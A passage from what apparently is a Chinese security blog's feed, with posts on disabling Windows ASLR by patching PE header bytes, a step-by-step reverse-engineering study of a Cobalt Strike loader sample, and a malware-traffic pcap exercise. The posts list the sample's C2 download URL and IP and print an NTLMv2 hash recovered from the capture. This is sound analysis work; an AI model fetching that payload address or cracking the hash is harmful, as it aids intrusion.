    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在分析样本的时候提到了ASLR，特地去了解了一下。记录一下</p><h2 id="ASLR的由来"><a href="#ASLR的由来" class="headerlink" title="ASLR的由来"></a>ASLR的由来</h2><p>微软从windows vista/windows server 2008（kernel version 6.0）开始采用ASLR技术，主要目的是为了防止缓冲区溢出<br>ASLR技术会使PE文件每次加载到内存的起始地址随机变化，并且进程的栈和堆的起始地址也会随机改变。<br>该技术需要操作系统和编译工具的双重支持（主要是操作系统的支持，编译工具主要作用是生成支持ASLR的PE格式）<br>若不想使用ASLR功能，可以在VS编译的时候将“配置属性-&gt;链接器-&gt;高级-&gt;随机基址”的值修改为否即可</p><h2 id="开启了ASLR和没开之间的区别"><a href="#开启了ASLR和没开之间的区别" class="headerlink" title="开启了ASLR和没开之间的区别"></a>开启了ASLR和没开之间的区别</h2><p>开启了ASLR的PE段多出一个.reloc，没开启ASLR没有.reloc这个段<br><img src="https://s3.ax1x.com/2020/12/19/rUkS9H.png" alt=""></p><p>IMAGE_FILE_HEADER\Characteristics<br>开启了ASLR的比没开启ASLR的少了一个IMAGE_FILE_RELOCS_STRRIPED<br>该字段的含义</p><p>重新定位信息被从文件中剥离。文件必须在它的首选基地址加载。如果基地址不可用，加载程序将报告错误。<br><code>https://msdn.microsoft.com/en-us/library/windows/desktop/ms680313(v = vs.85).aspx</code><br><img src="https://s3.ax1x.com/2020/12/19/rUktC4.png" alt=""></p><p>IMAGE_OPTIONAL_HEADER\DllCharacteristics<br>开启ASLR的程序比未开启的DllCharactersitics多了一个字段IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE，该字段值的含义<br><em>可以在加载时重新定位DLL</em><br><img src="https://s3.ax1x.com/2020/12/19/rUEWHP.png" alt=""></p><p>删除PE文件的ASLR功能<br>将IMAGE_OPTIONAL_HEADER\DllCharacteristic中的IMAGE_DLLCHARACTERISTICS_DYNAMIC字段值去掉即可：将PE中的十六进制第一个40 81数据改为00 81<br><img src="https://s3.ax1x.com/2020/12/19/rUViuR.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/19/rUVugH.png" alt=""></p><p>修改完在去看，发现IMAGE_DLLCHARACTERISTICS_DYNAMIC字段已经被删除<br><img src="https://s3.ax1x.com/2020/12/19/rUVlDI.png" alt=""></p><p>调试中的不同，无ASLR或关闭了ASLR是可以成功对应IDA的地址在OD中找到的<br><img src="https://s3.ax1x.com/2020/12/19/rUVJ58.png" alt=""></p><p>开启了ASLR后入口点和地址被随机化，无法定位<br><img src="https://s3.ax1x.com/2020/12/19/rUVtPS.png" alt=""></p><p>x64关闭ASLR<br>x64关闭PE的ASLR尝试寻找对应的十六进制发现找不到对应介绍的文章<br>后面发现可以用CFF Explore来关闭<br>64位<br><img src="https://s3.ax1x.com/2020/12/19/rUVcPU.png" alt=""></p><p>在编辑可选PE头的DllCharacteristics，点击Click here，将第一个复选框dll can move 去除勾选即可。改完以后Save<br><img src="https://s3.ax1x.com/2020/12/19/rUVqRe.png" alt=""></p><p>关闭ASLR后<br><img src="https://s3.ax1x.com/2020/12/19/rUVXMd.png" alt=""></p><p>关闭ASLR，从系统层面修改注册表；从PE文件中即修改相关字段值。<br>在调试程序的时候，因为地址随机化，每次调试地址都不一样，很是影响调试效果。关闭后文件总是加载到以400000为基址的地址范围内，代码的地址和IDA中也一直，所以大大方便分析。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/Kwansy/article/details/108292942" target="_blank" rel="noopener">修改PE可选头关闭ASLR</a><br><a href="https://www.jianshu.com/p/91b2b6665e64" target="_blank" rel="noopener">关闭地址随机化ASLR</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;昨天在分析样本的时候提到了ASLR，特地去了解了一下。记录一下&lt;/p&gt;
&lt;h2 id=&quot;ASLR的由来&quot;&gt;&lt;a href=&quot;#ASLR的由来</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>某远程加载马样本分析学习</title>
    <link href="http://422926799.github.io/posts/8f916cea.html"/>
    <id>http://422926799.github.io/posts/8f916cea.html</id>
    <published>2020-12-18T03:33:14.000Z</published>
    <updated>2020-12-18T17:02:57.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在freebuf上看到一篇名为：<a href="https://www.freebuf.com/articles/web/257752.html" target="_blank" rel="noopener">一个CS马伪装下的loader样本分析</a><br>跟着复现了一下，由于底子不够分析的可能不全。</p><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><p>Exeinfo<br>Detect Easy<br>IDA 7.5<br>API Monitor v2.0<br>Process Monitor<br>PEview<br>OD</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>根据文章给出的样本下载链接查看：<a href="https://app.any.run/tasks/ffc1ecff-e461-4474-8352-551db7e7b06f/" target="_blank" rel="noopener">https://app.any.run/tasks/ffc1ecff-e461-4474-8352-551db7e7b06f/</a><br>先在app.any.run看了一下分析结果<br><img src="https://s3.ax1x.com/2020/12/18/rJD9IS.png" alt=""></p><p>请求了两个URL,其中一个是二进制数据<br><a href="http://8.210.181.149:16678/9jhQ" target="_blank" rel="noopener">http://8.210.181.149:16678/9jhQ</a><br><img src="https://s3.ax1x.com/2020/12/18/rJDVrq.png" alt=""></p><p>目前得到的信息：<br>IP:8.210.181.149 - 归属地:香港<br>样本标记:Cobalt strike<br>执行方法疑似远程加载payload</p><p>微步社区查询该IP,已被标记<br><img src="https://s3.ax1x.com/2020/12/18/rJDceP.png" alt=""></p><p><a href="https://viz.greynoise.io/" target="_blank" rel="noopener">viz.greynoise.io</a>未标记cs<br><img src="https://s3.ax1x.com/2020/12/18/rJrKmt.png" alt=""></p><p>VT查杀<br><img src="https://s3.ax1x.com/2020/12/18/rJrM0P.png" alt=""></p><p>将样本下载到本地分析<br>md5 hash:3f37fc95aa5c8f7c304aa0dfc3ffbf2e<br>打开属性看到个数字签名<br><img src="https://s3.ax1x.com/2020/12/18/rJrJpQ.png" alt=""></p><p>Detect lt Easy拖进去查看，没有加壳，VC++写的<br><img src="https://s3.ax1x.com/2020/12/18/rJY95n.png" alt=""></p><p>查看导入的dll，就发现一个kernel.dll。windows API隐藏导入<br>该技术参考链接:<a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/" target="_blank" rel="noopener">https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/</a><br><img src="https://s3.ax1x.com/2020/12/18/rJ0d0K.png" alt=""></p><p>IDA静态分析<br>尝试搜索main函数，发现可以直接找到入口点（估计freebuf那篇文章作者用的是IDA 7.0没找到入口点）<br><img src="https://s3.ax1x.com/2020/12/18/rJsp9g.png" alt=""></p><p>跟到_main_0函数<br><img src="https://s3.ax1x.com/2020/12/18/rJr5tO.png" alt=""></p><p>首先跟踪__CheckForDebuggerJustMyCode<br><img src="https://s3.ax1x.com/2020/12/18/rJs3Hx.png" alt=""></p><p>dword_517944值看不到定义的是什么<br><img src="https://s3.ax1x.com/2020/12/18/rJsbPU.png" alt=""></p><p>往下面能看到调用了一堆API<br><img src="https://s3.ax1x.com/2020/12/18/rJygdx.png" alt=""></p><p>先不看这些API,继续分析_main_0。<code>_CheckForDebuggerJustMycode</code>后执行VirtualAlloc分配内存<br><img src="https://s3.ax1x.com/2020/12/18/rJyXY8.png" alt=""></p><p>之后调用_memmove函数，跟踪其unk_515000指针<br><img src="https://s3.ax1x.com/2020/12/18/rJ6KmR.png" alt=""></p><p>数组合并，hex转换回字符串<br><img src="https://s3.ax1x.com/2020/12/18/rJ6ccQ.png" alt=""></p><p>在解码后看到远程下载链接的路径9jhQ<br><img src="https://s3.ax1x.com/2020/12/18/rJ6f7q.png" alt=""></p><p>在payload尾部可以看见IP<br><img src="https://s3.ax1x.com/2020/12/18/rJ6XH1.png" alt=""></p><p>j__memmove函数分析，把VirtualAlloc分配内存的指针传入，把&amp;unk_515000指针传入该函数，传入大小799<br><img src="https://s3.ax1x.com/2020/12/18/rJgVsJ.png" alt=""></p><p>memmove函数为一个解码payload用的函数</p><pre><code class="c">void *__cdecl memmove(void *a1, const void *Src, size_t Size){  const __m128i *v3; // esi  size_t v4; // ecx  __m128i *v5; // edi  void *result; // eax  __int64 v7; // xmm1_8  __m128i v8; // xmm1  const __m128i *v9; // esi  __m128i v10; // xmm3  __m128i v11; // xmm0  __m128i v12; // xmm5  const __m128i *v13; // esi  __m128i v14; // xmm1  const __m128i *v15; // esi  __m128i v16; // xmm3  __m128i v17; // xmm0  __m128i v18; // xmm5  __m128i v19; // xmm1  const __m128i *v20; // esi  __m128i v21; // xmm3  __m128i v22; // xmm0  __m128i v23; // xmm5  __m128i v24; // xmm1  __int32 v25; // eax  __int64 v26; // xmm1_8  char v27; // dl  size_t v28; // ecx  const __m128i *v29; // esi  __m128i *v30; // edi  int v31; // edx  char v32; // dl  size_t v33; // ecx  int v34; // edx  __int8 *v35; // esi  char *v36; // edi  __m128i v37; // xmm1  __m128i v38; // xmm2  __m128i v39; // xmm3  __m128i v40; // xmm4  __m128i v41; // xmm5  __m128i v42; // xmm6  __m128i v43; // xmm7  __m128i v44; // xmm1  int v45; // eax  size_t v46; // edx  size_t j; // edx  __m128i v48; // xmm1  __m128i v49; // xmm2  __m128i v50; // xmm3  __m128i v51; // xmm5  __m128i v52; // xmm6  __m128i v53; // xmm7  size_t k; // edx  __m128i v55; // xmm1  unsigned int v56; // ecx  char v57; // al  unsigned int l; // ecx  int v59; // ecx  unsigned int v60; // eax  int v61; // ecx  unsigned int i; // eax  size_t v63; // [esp-4h] [ebp-Ch]  v3 = (const __m128i *)Src;  v4 = Size;  v5 = (__m128i *)a1;  if ( a1 &gt; Src &amp;&amp; a1 &lt; (char *)Src + Size )  {    v29 = (const __m128i *)((char *)Src + Size);    v30 = (__m128i *)((char *)a1 + Size);    if ( Size &gt;= 0x20 )    {      if ( _bittest(&amp;dword_5153EC, 1u) )      {        for ( ; ((unsigned __int8)v30 &amp; 0xF) != 0; v30-&gt;m128i_i8[0] = v29-&gt;m128i_i8[0] )        {          --v4;          v29 = (const __m128i *)((char *)v29 - 1);          v30 = (__m128i *)((char *)v30 - 1);        }        do        {          if ( v4 &lt; 0x80 )            break;          v29 -= 8;          v30 -= 8;          v37 = _mm_loadu_si128(v29 + 1);          v38 = _mm_loadu_si128(v29 + 2);          v39 = _mm_loadu_si128(v29 + 3);          v40 = _mm_loadu_si128(v29 + 4);          v41 = _mm_loadu_si128(v29 + 5);          v42 = _mm_loadu_si128(v29 + 6);          v43 = _mm_loadu_si128(v29 + 7);          *v30 = _mm_loadu_si128(v29);          v30[1] = v37;          v30[2] = v38;          v30[3] = v39;          v30[4] = v40;          v30[5] = v41;          v30[6] = v42;          v30[7] = v43;          v4 -= 128;        }        while ( (v4 &amp; 0xFFFFFF80) != 0 );        if ( v4 &gt;= 0x20 )        {          do          {            v29 -= 2;            v30 -= 2;            v44 = _mm_loadu_si128(v29 + 1);            *v30 = _mm_loadu_si128(v29);            v30[1] = v44;            v4 -= 32;          }          while ( (v4 &amp; 0xFFFFFFE0) != 0 );        }      }      else      {        if ( ((unsigned __int8)v30 &amp; 3) != 0 )        {          v31 = (unsigned __int8)v30 &amp; 3;          v4 = Size - v31;          do          {            v30[-1].m128i_i8[15] = v29[-1].m128i_i8[15];            v29 = (const __m128i *)((char *)v29 - 1);            v30 = (__m128i *)((char *)v30 - 1);            --v31;          }          while ( v31 );        }        if ( v4 &gt;= 0x20 )        {          v32 = v4;          v33 = v4 &gt;&gt; 2;          v34 = v32 &amp; 3;          v35 = &amp;v29[-1].m128i_i8[12];          v36 = &amp;v30[-1].m128i_i8[12];          while ( v33 )          {            *(_DWORD *)v36 = *(_DWORD *)v35;            v35 -= 4;            v36 -= 4;            --v33;          }          switch ( v34 )          {            case 0:              result = a1;              break;            case 1:              v36[3] = v35[3];              result = a1;              break;            case 2:              v36[3] = v35[3];              v36[2] = v35[2];              result = a1;              break;            case 3:              v36[3] = v35[3];              v36[2] = v35[2];              v36[1] = v35[1];              result = a1;              break;          }          return result;        }      }    }    for ( ; (v4 &amp; 0xFFFFFFFC) != 0; v4 -= 4 )    {      v30 = (__m128i *)((char *)v30 - 4);      v29 = (const __m128i *)((char *)v29 - 4);      v30-&gt;m128i_i32[0] = v29-&gt;m128i_i32[0];    }    for ( ; v4; --v4 )    {      v30 = (__m128i *)((char *)v30 - 1);      v29 = (const __m128i *)((char *)v29 - 1);      v30-&gt;m128i_i8[0] = v29-&gt;m128i_i8[0];    }    result = a1;  }  else  {    if ( Size &lt; 0x20 )      goto CopyUpDwordMov;    if ( Size &lt; 0x80 )    {      if ( !_bittest(&amp;dword_5153EC, 1u) )        goto Dword_align;      goto XmmCopySmallTest;    }    if ( _bittest(dword_51628C, 1u) )    {      qmemcpy(a1, Src, Size);      return a1;    }    if ( (((unsigned int)Src ^ (unsigned int)a1) &amp; 0xF) == 0 &amp;&amp; _bittest(&amp;dword_5153EC, 1u) )    {      v45 = (unsigned __int8)Src &amp; 0xF;      if ( ((unsigned __int8)Src &amp; 0xF) != 0 )      {        v63 = Size - (16 - v45);        v60 = 16 - v45;        v61 = v60 &amp; 3;        if ( (v60 &amp; 3) != 0 )        {          do          {            v5-&gt;m128i_i8[0] = v3-&gt;m128i_i8[0];            v3 = (const __m128i *)((char *)v3 + 1);            v5 = (__m128i *)((char *)v5 + 1);            --v61;          }          while ( v61 );        }        for ( i = v60 &gt;&gt; 2; i; --i )        {          v5-&gt;m128i_i32[0] = v3-&gt;m128i_i32[0];          v3 = (const __m128i *)((char *)v3 + 4);          v5 = (__m128i *)((char *)v5 + 4);        }        v4 = v63;      }      v46 = v4;      v4 &amp;= 0x7Fu;      for ( j = v46 &gt;&gt; 7; j; --j )      {        v48 = _mm_load_si128(v3 + 1);        v49 = _mm_load_si128(v3 + 2);        v50 = _mm_load_si128(v3 + 3);        *v5 = _mm_load_si128(v3);        v5[1] = v48;        v5[2] = v49;        v5[3] = v50;        v51 = _mm_load_si128(v3 + 5);        v52 = _mm_load_si128(v3 + 6);        v53 = _mm_load_si128(v3 + 7);        v5[4] = _mm_load_si128(v3 + 4);        v5[5] = v51;        v5[6] = v52;        v5[7] = v53;        v3 += 8;        v5 += 8;      }XmmCopySmallTest:      if ( !v4 )        return a1;      for ( k = v4 &gt;&gt; 5; k; --k )      {        v55 = _mm_loadu_si128(v3 + 1);        *v5 = _mm_loadu_si128(v3);        v5[1] = v55;        v3 += 2;        v5 += 2;      }CopyUpDwordMov:      v56 = v4 &amp; 0x1F;      if ( v56 )      {        v57 = v56;        for ( l = v56 &gt;&gt; 2; l; --l )        {          v5-&gt;m128i_i32[0] = v3-&gt;m128i_i32[0];          v5 = (__m128i *)((char *)v5 + 4);          v3 = (const __m128i *)((char *)v3 + 4);        }        v59 = v57 &amp; 3;        if ( (v57 &amp; 3) != 0 )        {          do          {            v5-&gt;m128i_i8[0] = v3-&gt;m128i_i8[0];            v3 = (const __m128i *)((char *)v3 + 1);            v5 = (__m128i *)((char *)v5 + 1);            --v59;          }          while ( v59 );        }      }      return a1;    }    if ( !_bittest(dword_51628C, 0) || ((unsigned __int8)a1 &amp; 3) != 0 )    {Dword_align:      if ( ((unsigned __int8)a1 &amp; 3) != 0 )      {        do        {          v5-&gt;m128i_i8[0] = v3-&gt;m128i_i8[0];          --v4;          v3 = (const __m128i *)((char *)v3 + 1);          v5 = (__m128i *)((char *)v5 + 1);        }        while ( ((unsigned __int8)v5 &amp; 3) != 0 );      }      goto Dword_align_Ok;    }    if ( ((unsigned __int8)Src &amp; 3) != 0 )    {Dword_align_Ok:      v27 = v4;      if ( v4 &gt;= 0x20 )      {        v28 = v4 &gt;&gt; 2;        qmemcpy(v5, v3, 4 * v28);        v13 = (const __m128i *)((char *)v3 + 4 * v28);        v5 = (__m128i *)((char *)v5 + 4 * v28);        switch ( v27 &amp; 3 )        {          case 0:            goto TrailingUp0;          case 1:            goto TrailingUp1;          case 2:            goto TrailingUp2;          case 3:            goto TrailingUp3;        }      }      goto CopyUpDwordMov;    }    if ( _bittest((const int *)&amp;v5, 2u) )    {      v4 = Size - 4;      v3 = (const __m128i *)((char *)Src + 4);      *(_DWORD *)a1 = *(_DWORD *)Src;      v5 = (__m128i *)((char *)a1 + 4);    }    if ( _bittest((const int *)&amp;v5, 3u) )    {      v7 = v3-&gt;m128i_i64[0];      v4 -= 8;      v3 = (const __m128i *)((char *)v3 + 8);      v5-&gt;m128i_i64[0] = v7;      v5 = (__m128i *)((char *)v5 + 8);    }    if ( ((unsigned __int8)v3 &amp; 7) != 0 )    {      if ( _bittest((const int *)&amp;v3, 3u) )      {        v8 = _mm_load_si128((const __m128i *)((char *)v3 - 12));        v9 = (const __m128i *)((char *)v3 - 12);        do        {          v10 = _mm_load_si128(v9 + 1);          v4 -= 48;          v11 = _mm_load_si128(v9 + 2);          v12 = _mm_load_si128(v9 + 3);          v9 += 3;          *v5 = _mm_alignr_epi8(v10, v8, 12);          v5[1] = _mm_alignr_epi8(v11, v10, 12);          v8 = v12;          v5[2] = _mm_alignr_epi8(v12, v11, 12);          v5 += 3;        }        while ( v4 &gt;= 0x30 );        v13 = (const __m128i *)&amp;v9-&gt;m128i_i8[12];      }      else      {        v19 = _mm_load_si128((const __m128i *)((char *)v3 - 4));        v20 = (const __m128i *)((char *)v3 - 4);        do        {          v21 = _mm_load_si128(v20 + 1);          v4 -= 48;          v22 = _mm_load_si128(v20 + 2);          v23 = _mm_load_si128(v20 + 3);          v20 += 3;          *v5 = _mm_alignr_epi8(v21, v19, 4);          v5[1] = _mm_alignr_epi8(v22, v21, 4);          v19 = v23;          v5[2] = _mm_alignr_epi8(v23, v22, 4);          v5 += 3;        }        while ( v4 &gt;= 0x30 );        v13 = (const __m128i *)&amp;v20-&gt;m128i_i8[4];      }    }    else    {      v14 = _mm_load_si128((const __m128i *)((char *)v3 - 8));      v15 = (const __m128i *)((char *)v3 - 8);      do      {        v16 = _mm_load_si128(v15 + 1);        v4 -= 48;        v17 = _mm_load_si128(v15 + 2);        v18 = _mm_load_si128(v15 + 3);        v15 += 3;        *v5 = _mm_alignr_epi8(v16, v14, 8);        v5[1] = _mm_alignr_epi8(v17, v16, 8);        v14 = v18;        v5[2] = _mm_alignr_epi8(v18, v17, 8);        v5 += 3;      }      while ( v4 &gt;= 0x30 );      v13 = (const __m128i *)&amp;v15-&gt;m128i_i8[8];    }    while ( 2 )    {      if ( _bittest((const int *)&amp;v4, 2u) )      {        v25 = v13-&gt;m128i_i32[0];        v4 -= 4;        v13 = (const __m128i *)((char *)v13 + 4);        v5-&gt;m128i_i32[0] = v25;        v5 = (__m128i *)((char *)v5 + 4);      }      if ( _bittest((const int *)&amp;v4, 3u) )      {        v26 = v13-&gt;m128i_i64[0];        v4 -= 8;        v13 = (const __m128i *)((char *)v13 + 8);        v5-&gt;m128i_i64[0] = v26;        v5 = (__m128i *)((char *)v5 + 8);      }      switch ( v4 )      {        case 0u:TrailingUp0:          result = a1;          break;        case 1u:TrailingUp1:          v5-&gt;m128i_i8[0] = v13-&gt;m128i_i8[0];          result = a1;          break;        case 2u:TrailingUp2:          v5-&gt;m128i_i8[0] = v13-&gt;m128i_i8[0];          v5-&gt;m128i_i8[1] = v13-&gt;m128i_i8[1];          result = a1;          break;        case 3u:TrailingUp3:          v5-&gt;m128i_i8[0] = v13-&gt;m128i_i8[0];          v5-&gt;m128i_i8[1] = v13-&gt;m128i_i8[1];          v5-&gt;m128i_i8[2] = v13-&gt;m128i_i8[2];          result = a1;          break;        default:          v24 = _mm_loadu_si128(v13);          v4 -= 16;          ++v13;          *v5++ = v24;          continue;      }      break;    }  }  return result;}</code></pre><p>懒得分析解密过程，直接将样本关闭ASLR，拖入OD断点对应的位置分析<br>关闭ASLR参考链接:<a href="https://www.jianshu.com/p/91b2b6665e64" target="_blank" rel="noopener">关闭ASLR</a><br>PEView查看对应的偏移地址将40 81改为00 81 (小端内存读为80 41)<br>(搜索 40 81的第一个位置修改)<br><img src="https://s3.ax1x.com/2020/12/18/rYCt2V.png" alt=""></p><p>(修改之后)<br><img src="https://s3.ax1x.com/2020/12/18/rY9I3V.md.png" alt=""></p><p>OD打开Ctrl+G转到对应的地址，断点<br><img src="https://s3.ax1x.com/2020/12/18/rYkksf.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYFAUJ.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYiqHg.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYEm2n.png" alt=""></p><p>F8到把v4作为函数执行的时候<br><img src="https://s3.ax1x.com/2020/12/18/rYECKP.png" alt=""></p><p>读取UA头和winnet<br><img src="https://s3.ax1x.com/2020/12/18/rYEPDf.md.png" alt=""></p><p>然后读完部分payload后读取自身<br>(这里是看freebuf那篇文章所理解的)<br><img src="https://s3.ax1x.com/2020/12/18/rYVPzR.png" alt=""></p><p>OD验证<br><img src="https://s3.ax1x.com/2020/12/18/rYVGef.png" alt=""></p><p>之后获取Kernel.dll所有的函数<br><img src="https://s3.ax1x.com/2020/12/18/rYZMAU.png" alt=""></p><p>利用GetProcAddress获取了对应的API函数地址，并实例化该API<br><img src="https://s3.ax1x.com/2020/12/18/rYedrq.png" alt=""></p><p>利用OD插件windows API断点下断GetProcAddress能看到所有实例化的API<br>(太多了就不一一列出来了)<br><img src="https://s3.ax1x.com/2020/12/18/rY1xP0.png" alt=""></p><p>原本想跟着IDA的函数调用图一步一步OD调，然后不知道为什么无法生成，直接OD定位到main函数地址调试<br><img src="https://s3.ax1x.com/2020/12/18/rYNiqO.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/18/rYNEIH.png" alt=""></p><p>跟踪到Address:00453510的call执行完后就退出了，所以跟进去<br><img src="https://s3.ax1x.com/2020/12/18/rYUxjx.png" alt=""></p><p>跟进第一个call<br><img src="https://s3.ax1x.com/2020/12/18/rY0cMn.png" alt=""></p><p>得到wininet关键字<br><img src="https://s3.ax1x.com/2020/12/18/rY0HMR.png" alt=""></p><p>跟进call ebp发现获取自身加载的Module<br><img src="https://s3.ax1x.com/2020/12/18/rYBSRH.png" alt=""></p><p>加载了wchar.h,获取LoadLibraryExA关键字并实例化<br><img src="https://s3.ax1x.com/2020/12/18/rYBqpQ.png" alt=""></p><p>加载twain_32.dll<br><img src="https://s3.ax1x.com/2020/12/18/rYDpkT.png" alt=""></p><p>解除IP地址<br><img src="https://s3.ax1x.com/2020/12/18/rYXL8S.png" alt=""></p><p>解密出UA头<br><img src="https://s3.ax1x.com/2020/12/18/rYLTsA.png" alt=""></p><p>在wininet下断点，得到返回的数据<br><img src="https://s3.ax1x.com/2020/12/18/rYzYqJ.png" alt=""></p><p>23:26分<br>由于底子不行，调试到后面不会弄只能跟跟马子的行为<br>OD里的字符串<br><img src="https://s3.ax1x.com/2020/12/18/rteuXn.md.png" alt=""></p><p>文章后面作者成功dump了下载的第二段payload并解密保存<br>(实在是断不到那个解密后得到PE的点)<br><img src="https://s3.ax1x.com/2020/12/19/rt8vQK.png" alt=""></p><p>目标行为<br>读取对应的注册表和收集cookie保存在某个txt上传<br><img src="https://s3.ax1x.com/2020/12/19/rt8WR0.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/19/rt84MT.png" alt=""></p><p>远程下载<br><img src="https://s3.ax1x.com/2020/12/19/rt8ORx.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前并没有这么分析过，经过这次分析学习到了一些东西</p><ul><li>样本关闭ASLR</li><li>IDA和OD调试对比</li><li>断点的一些技巧</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在freebuf上看到一篇名为：&lt;a href=&quot;https://www.freebuf.com/articles/web/257752.h</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>malware-traffic恶意流量包分析笔记</title>
    <link href="http://422926799.github.io/posts/daac1c3c.html"/>
    <id>http://422926799.github.io/posts/daac1c3c.html</id>
    <published>2020-12-14T16:29:00.000Z</published>
    <updated>2020-12-14T17:56:11.178Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)<br>翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄<br><a href="https://www.malware-traffic-analysis.net/" target="_blank" rel="noopener">https://www.malware-traffic-analysis.net/</a><br>解压密码:infected<br><img src="https://s3.ax1x.com/2020/12/15/ru7id0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>wireshark打开后，我比较喜欢先统计一下所有的IP，和包里有什么协议，还有注意一下导出分组里的内容。<br>导出对象<br><img src="https://s3.ax1x.com/2020/12/15/ru7mQJ.png" alt=""><br>IP统计<br><img src="https://s3.ax1x.com/2020/12/15/ru7wwt.png" alt=""><br>协议分级<br><img src="https://s3.ax1x.com/2020/12/15/ru7ny9.png" alt=""></p><p>从上图可以得到以下几点信息：</p><ul><li>存在HTTP、SMB、LDAP、DNS流量</li><li>SMB和LDAP流量占多</li><li>源IP访问的目标IP端口</li></ul><p>看了一下HTTP流量，发现是下载了三个文件<br><img src="https://s3.ax1x.com/2020/12/15/ruHA0I.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruHZAP.png" alt=""></p><p>尝试过提取出来，发现并不行。失败了，将pcap上传到<a href="https://pcap.zhouhe.360.cn/发现VT上有样本" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/发现VT上有样本</a><br><img src="https://s3.ax1x.com/2020/12/15/ruL2CV.png" alt=""></p><p>三个都免杀，但是看了一下VT的检测结果。发现没有任何外连(不排除判断是否在虚拟机里运行，是的话直接ExitProcess)<br>查询结果：<a href="https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog</a><br><img src="https://s3.ax1x.com/2020/12/15/ruLfvF.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL4u4.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL5DJ.png" alt=""></p><p>HTTP流量到这里貌似也没啥好追的了，看了一眼TLS也没啥异样<br><img src="https://s3.ax1x.com/2020/12/15/ruLH4x.png" alt=""></p><p>然后把目光转向smb，发现存在个域。使用Kerberos TGT访问的域控<br><img src="https://s3.ax1x.com/2020/12/15/ruLXvD.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruLOgO.png" alt=""></p><p>看了一下成功认证smb后访问过的文件和文件夹，也没有干啥<br><img src="https://s3.ax1x.com/2020/12/15/ruOpVA.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOC5t.png" alt=""></p><p>后面用NTLMRawUnHide从数据包里提取出了一个NTLM<br><img src="https://s3.ax1x.com/2020/12/15/ruOF8f.png" alt=""></p><p>至此信息如下：</p><pre><code>HTTP------------domain:t497sword.com - 5.44.3.72 4- 俄罗斯莫斯科download.windowsupdate.com - 72.21.81.240 - 美国ctldl.windowsupdate.com -67.24.185.254 - 美国SMB-------------\\MRNATURAL.INFO\IPC$\\MrNatural-DC.mrnatural.info\IPC$info--------------10.12.1.101 hostname:Lenovo_2b Mac:10:c5:95:2b:13:0510.12.1.2 hostname:Dell_99 Mac:00:11:43:99:de:87[1;37mFound NTLMSSP Message Type 3 :[1;32m Authentication[0;37m    [1;34m&gt;[1;37m Domain                 :[0;97m MRNATURAL [0;37m    [1;34m&gt;[1;37m Username               :[0;97m fabulous.dale [0;37m    [1;34m&gt;[1;37m Workstation            :[0;97m DESKTOP-NATURAL [0;37m[1;37mNTLMv2 Hash recovered:[0;97mMRNATURAL\fabulous.dale::DESKTOP-NATURAL:100dd7adfc69d6a4:2a6c2ec69501afb83ce01d54e115314f:0101000000000000d0521c723bc8d601e8b8829daacf831700000000020012004d0052004e00410054005500520041004c00010018004d0052004e00410054005500520041004c002d004400430004001c006d0072006e00610074007500720061006c002e0069006e0066006f00030036004d0072004e00610074007500720061006c002d00440043002e006d0072006e00610074007500720061006c002e0069006e0066006f0005001c006d0072006e00610074007500720061006c002e0069006e0066006f0007000800d0521c723bc8d60106000400020000000800300030000000000000000000000000200000764598ededc17516e4c2b0bf2070ee5ff48e1dbf474b9cf30823f0967cb02e2e0a001000000000000000000000000000000000000900260063006900660073002f004d0052004e00410054005500520041004c002e0049004e0046004f000000000000000000</code></pre><p>后面追踪主机名，看到LDAP查询的内容</p><pre><code>&quot;DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;&quot;CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=mrnatural,DC=info&quot;&quot;cn=policies,cn=system,DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-N